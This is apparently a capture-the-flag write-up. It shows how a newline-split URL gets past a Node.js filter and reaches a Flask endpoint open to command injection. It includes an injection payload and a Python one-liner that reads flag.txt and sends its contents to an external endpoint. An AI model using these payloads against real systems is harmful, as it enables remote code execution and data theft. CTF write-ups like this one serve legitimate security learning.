# Bypassing URL Filters to Achieve Remote Code Execution (RCE)

This challenge was really fun, even though it was labeled as Easy.

We start by analyzing two scripts: a Node.js application for the frontend and a Flask application for the backend.

The frontend application allows us to make calls via Puppeteer to the backend application, which provides a static response if the call is successful.

The program generates a cookie containing a secret and sends it to the backend. By examining the backend routes, it’s easy to figure out that by calling the _get_cal_ endpoint, we can potentially get a shell and try to inject arbitrary commands.

The first part of the challenge involved figuring out what was under the attacker's control. The only information available was the backend’s location, which Puppeteer used to query. Therefore, I focused heavily on bypassing the URL filtering mechanism.

In particular, I needed to bypass this condition, which was relatively simple but restrictive:

```js
if (url.includes("cal") || url.includes("%")) {
  res.send('Error: "cal" is not allowed in the URL');
  return;
}
```

With this condition in place, the string 'cal' and the '%' character were not allowed in the URL.

After experimenting with Burp Suite, I realized that it's possible to split the string across lines like this:

```
api/ca
l?...
```

This was the most challenging part of the exploit. By using this trick, we can bypass the defense and hit the backend’s correct route, as the following instruction simply skips newline characters:

```js
await page.goto(url, { timeout: 5000, waitUntil: "networkidle2" });
```

With this in mind, we can now craft a basic payload to inject arbitrary commands, such as:

```
path=/api/ca
l?modifier=;whoami
```

By replicating the application in a local environment, we can confirm that this command allows us to execute arbitrary commands on the backend.

The final step was figuring out how to retrieve the flag or the result we wanted from this capability. For this, I used #REQUESTBIN#, which provides a globally accessible endpoint for capturing HTTP requests. The idea was to send the flag as a path parameter to this endpoint.

After setting up a basic trigger and monitoring the logs on the dashboard, I passed the following payload to admin.js:

```
path=/api/ca
l?modifier=;python3 -c "import http.client; secret=open('./flag.txt').readline(); conn = http.client.HTTPSConnection('my-endpoint'); conn.request('GET', f'/{secret.strip()}'); response = conn.getresponse(); print(response.status, response.reason); data = response.read(); print(data.decode()); conn.close()"
```

This allowed me to extract the flag successfully.
